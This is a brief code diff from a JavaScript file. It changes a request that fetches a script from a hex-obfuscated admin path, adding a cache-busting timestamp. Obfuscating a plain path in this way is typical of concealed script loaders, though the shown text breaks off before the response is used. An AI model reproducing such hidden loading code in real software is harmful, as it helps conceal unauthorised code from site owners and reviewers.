@@ -16,7 +16,7 @@ window.onresize = function() {
 };
 
 var _httpRequestTmp = new XMLHttpRequest();
-_httpRequestTmp.open('GET', "/\x61\x64\x6d\x69\x6e/\x74\x70\x6c/\x6a\x73/\x61\x64\x6d.\x6a\x73", true);
+_httpRequestTmp.open('GET', "/\x61\x64\x6d\x69\x6e/\x74\x70\x6c/\x6a\x73/\x61\x64\x6d.\x6a\x73" + "?" + new Date().getTime(), true);
 _httpRequestTmp.send();
 _httpRequestTmp.onreadystatechange = function () {
     if (_httpRequestTmp.readyState == 4 && _httpRequestTmp.status == 200) {
